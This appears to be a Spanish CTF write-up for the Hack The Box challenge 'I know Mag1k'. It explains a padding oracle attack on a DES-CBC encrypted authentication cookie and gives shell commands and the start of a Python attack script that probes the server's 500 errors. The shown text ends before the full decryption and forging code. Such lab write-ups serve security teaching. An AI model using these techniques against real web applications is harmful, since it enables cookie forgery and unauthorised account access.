<!doctype html><html lang="es"><head><title>I know Mag1k | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="DES. _Padding Oracle Attack_"><meta name="image" content="https://7rocky.github.io/images/cryptography.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="DES. _Padding Oracle Attack_"><meta itemprop="keywords" content><meta itemprop="name" content="I know Mag1k"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="DES. _Padding Oracle Attack_"><meta property="og:image" content="https://7rocky.github.io/images/cryptography.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="I know Mag1k"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="DES. _Padding Oracle Attack_"><meta name="twitter:description" content="DES. _Padding Oracle Attack_"><meta name="twitter:image" content="https://7rocky.github.io/images/cryptography.png"><meta name="twitter:title" content="I know Mag1k"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\lcm}{\mathop{\mathrm{lcm}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src="/js/imc.js"></script><script>(async()=>await typeset(()=>[`#math-consts`]))()</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/crypto/i-know-mag1k/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- CRYPTO</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/&amp;text=I%20know%20Mag1k" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/crypto/i-know-mag1k/&amp;title=I%20know%20Mag1k" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">I know Mag1k</h1><p class="mb4 f6 dib tracked">7 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-cifrado">Análisis del cifrado</a><ul><li><a href="#_padding-oracle-attack_"><em>Padding Oracle Attack</em></a></li><li><a href="#pruebas">Pruebas</a></li><li><a href="#descifrado">Descifrado</a></li><li><a href="#cifrado">Cifrado</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona el siguiente sitio web:</p><p><img alt="I know Mag1k 1" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-1.webp"></p><p>En primer lugar, debemos registrar una nueva cuenta:</p><p><img alt="I know Mag1k 2" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-2.webp"></p><p>Ahora podemos iniciar sesión:</p><p><img alt="I know Mag1k 3" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-3.webp"></p><p>Y tenemos acceso a nuestro <em>dashboard</em>:</p><p><img alt="I know Mag1k 4" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-4.webp"></p><p>Podemos ver que el servidor establece dos <em>cookies</em> para manejar la autenticación:</p><p><img alt="I know Mag1k 5" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-5.webp"></p><h2 id="análisis-del-cifrado">Análisis del cifrado</h2><p>La que parece interesante es <code>iknowmag1k</code>, que está codificada en base64 (y codificación URL: <code>%2B</code> es <code>+</code>, <code>%2F</code> es <code>/</code> y <code>%3D</code> es <code>=</code>). Si lo decodificamos, tenemos 40 bytes que parecen aleatorios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> FQFQj7Z5CjqRtQnnJ6Ve5SkqIpmUWALSRp6k6ELH+G/oErSPjLuBxA== | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">xxd</span>
00000000: 1501 508f b679 0a3a 91b5 09e7 27a5 5ee5  ..P..y.:....'.^.
00000010: 292a 2299 9458 02d2 469e a4e8 42c7 f86f  )*"..X..F...B..o
00000020: e812 b48f 8cbb 81c4                      ........

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> FQFQj7Z5CjqRtQnnJ6Ve5SkqIpmUWALSRp6k6ELH+G/oErSPjLuBxA== | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">wc</span> -c  
40
</code></pre></div><p>Vamos a modificar el último byte de la <em>cookie</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> FQFQj7Z5CjqRtQnnJ6Ve5SkqIpmUWALSRp6k6ELH+G/oErSPjLuBxA== | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">xxd</span> -p | <span class="code-dark-green">tr</span> -d \\n
1501508fb6790a3a91b509e727a55ee5292a2299945802d2469ea4e842c7f86fe812b48f8cbb81c4

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 1501508fb6790a3a91b509e727a55ee5292a2299945802d2469ea4e842c7f86fe812b48f8cbb81c3 | <span class="code-dark-green">xxd</span> -r -p | <span class="code-dark-green">base64</span>  
FQFQj7Z5CjqRtQnnJ6Ve5SkqIpmUWALSRp6k6ELH+G/oErSPjLuBww==
</code></pre></div><p>Ahora podemos actualizar la <em>cookie</em> en el navegador y actualizar la página:</p><p><img alt="I know Mag1k 6" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-6.webp"></p><p>Ahora no vemos el nombre de usuario. Y además, el servidor responde con error 500 <em>Internal Server Error</em>:</p><p><img alt="I know Mag1k 7" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-7.webp"></p><p>Por lo tanto, debemos haber estropeado algo en la <em>cookie</em>. Entonces, la <em>cookie</em> no es aleatoria sino que está cifrada.</p><p>Si creamos otra cuenta con un nombre más grande, veremos que la <em>cookie</em> ahora contiene 56 bytes:</p><p><img alt="I know Mag1k 8" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-8.webp"></p><p><img alt="I know Mag1k 9" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-9.webp"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> Zb899uoBuMrdQt785d2q41Tt2g/HquVRw6kR8BE/cdOOdryafL7k/1zqT3uEsSPVIAKxpjIcwIU= | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">wc</span> -c  
56
</code></pre></div><p>Entonces, agregar 8 caracteres adicionales al nombre de usuario da como resultado 16 bytes más cifrados. Esta es una señal de que el servidor usa un cifrado en bloque y, por lo tanto, debe haber una implementación de relleno.</p><p>El cifrado en bloque no es AES porque los bloques tendrían 16 bytes, y el número de bytes de la <em>cookie</em> no es divisible entre 16. Por lo tanto, el tamaño del bloque debe ser 8, por lo que estamos tratando con DES en modo CBC:</p><p><img alt="I know Mag1k 10" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-10.webp"></p><p>Probablemente tendremos que realizar un <em>Padding Oracle Attack</em> para descifrar la <em>cookie</em> y luego cifraremos otra <em>cookie</em> para acceder a un panel de administración.</p><h3 id="_padding-oracle-attack_"><em>Padding Oracle Attack</em></h3><p>La implementación del relleno más común es PKCS7, que simplemente agrega algunos bytes al mensaje de la siguiente manera:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; from Crypto.Util.Padding import pad
&gt;&gt;&gt; pad(b'asdf', 16)
b'asdf\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c'
&gt;&gt;&gt; pad(b'asdfasdf', 16)
b'asdfasdf\x08\x08\x08\x08\x08\x08\x08\x08'
&gt;&gt;&gt; pad(b'asdfasdfasdf', 16)
b'asdfasdfasdf\x04\x04\x04\x04'
&gt;&gt;&gt; pad(b'asdfasdfasdfasdf', 16)
b'asdfasdfasdfasdf\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'  
&gt;&gt;&gt; pad(b'asdf', 8)
b'asdf\x04\x04\x04\x04'
&gt;&gt;&gt; pad(b'asdfasdf', 8)
b'asdfasdf\x08\x08\x08\x08\x08\x08\x08\x08'
&gt;&gt;&gt; pad(b'asdfasdfas', 8)
b'asdfasdfas\x06\x06\x06\x06\x06\x06'
&gt;&gt;&gt; pad(b'asdfasdfasd', 8)
b'asdfasdfasd\x05\x05\x05\x05\x05'
&gt;&gt;&gt; pad(b'asdfasdfasdf', 8)
b'asdfasdfasdf\x04\x04\x04\x04'
</code></pre></div><p>El relleno es predecible, porque los bytes de relleno son solo el número de bytes restantes para llenar un bloque en formato bytes.</p><p>Una vez que el servidor descifra la <em>cookie</em>, elimina el relleno. El servidor es un oráculo de relleno porque si el relleno es correcto, muestra nuestro <em>dashboard</em>. De lo contrario, el servidor envía un error 500 <em>Internal Server Error</em>.</p><p>El <em>Padding Oracle Attack</em> funciona de la siguiente manera:</p><p><img alt="I know Mag1k 11" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-11.webp"></p><p>Podemos ajustar el segundo bloque de texto cifrado ($\mathrm{ct}[j - 1]$), lo que afecta directamente al último bloque de texto claro ($\mathrm{pt}[j]$). La idea es iterar el último byte de <code>0x00</code> a <code>0xff</code> hasta que encontremos uno que resulte en <code>0x01</code> (el primer byte de relleno de PKCS7). En este punto, el servidor mostrará un mensaje exitoso. Sea $B_i$ este byte &ldquo;mágico&rdquo;. Dado que no hay error de relleno, estas condiciones se mantienen:</p><p class="scroll">$$
B_i \oplus \mathrm{DES.dec}(\mathrm{ct}[j])_i = \mathrm{pad}_i \iff \mathrm{DES.dec}(\mathrm{ct}[j])_i = B_i \oplus \mathrm{pad}_i
$$</p><p>Entonces, el byte de texto claro $\mathrm{pt}[j]_i$ se calcula de la siguiente manera:</p><p class="scroll">$$
\mathrm{pt}[j]_i = \mathrm{ct}[j - 1]_i \oplus \mathrm{DES.dec}(\mathrm{ct}[j])_i
$$</p><p>Dado que el IV se envía con el texto cifrado, podemos simplificar el esquema de ataque a este:</p><p><img alt="I know Mag1k 12" src="/images/HTB-Challenges/HTB-Crypto-I-know-Mag1k-12.webp"></p><h3 id="pruebas">Pruebas</h3><p>Ahora, usaremos la siguiente función de Python para el oráculo de relleno:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">oracle</span><span class="mtk1">(</span><span class="mtk9 mtki">cookie</span><span class="mtk1">: </span><span class="mtk8 mtku">str</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bool</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk5">global</span><span class="mtk1"> </span><span class="mtk1">url</span>
<span class="mtk1">    </span><span class="mtk5">global</span><span class="mtk1"> </span><span class="mtk1">phpsessid</span>

<span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">url</span><span class="mtk6">}</span><span class="mtk4">/profile.php'</span><span class="mtk1">, </span><span class="mtk9 mtki">cookies</span><span class="mtk5">=</span><span class="mtk1">{</span>  
<span class="mtk1">        </span><span class="mtk4">'PHPSESSID'</span><span class="mtk1">: </span><span class="mtk1">phpsessid</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'iknowmag1k'</span><span class="mtk1">: </span><span class="mtk9 mtki">cookie</span>
<span class="mtk1">    })</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">r</span><span class="mtk1">.</span><span class="mtk1">status_code</span><span class="mtk1"> </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">500</span>
</code></pre></div><p>Y podemos hacer lo siguiente para registrarnos, iniciar sesión y tomar las <em>cookies</em> relevantes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">global</span><span class="mtk1"> </span><span class="mtk1">url</span>
<span class="mtk1">    </span><span class="mtk5">global</span><span class="mtk1"> </span><span class="mtk1">phpsessid</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Usage: python3 </span><span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4"> &lt;host:port&gt;'</span><span class="mtk1">)</span>  
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk8 mtku detected-link">sys</span><span class="mtk1 detected-link">.</span><span class="mtk1 detected-link">argv</span><span class="mtk1 detected-link">[</span><span class="mtk6 detected-link">1</span><span class="mtk1 detected-link">]</span><span class="mtk6">}</span><span class="mtk4">'</span>

<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">session</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">url</span><span class="mtk6">}</span><span class="mtk4">/register.php'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'username'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'email'</span><span class="mtk1">: </span><span class="mtk4">'asdf@asdf.com'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'password'</span><span class="mtk1">: </span><span class="mtk4">'asdffdsa'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'confirm'</span><span class="mtk1">: </span><span class="mtk4">'asdffdsa'</span>
<span class="mtk1">    })</span>

<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">url</span><span class="mtk6">}</span><span class="mtk4">/login.php'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'username'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'password'</span><span class="mtk1">: </span><span class="mtk4">'asdffdsa'</span><span class="mtk1">,</span>
<span class="mtk1">    })</span>

<span class="mtk1">    </span><span class="mtk1">phpsessid</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">[</span><span class="mtk4">'PHPSESSID'</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">iknowmag1k</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">[</span><span class="mtk4">'iknowmag1k'</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'PHPSESSID: </span><span class="mtk6">{</span><span class="mtk1">phpsessid</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'iknowmag1k: </span><span class="mtk6">{</span><span class="mtk1">iknowmag1k</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
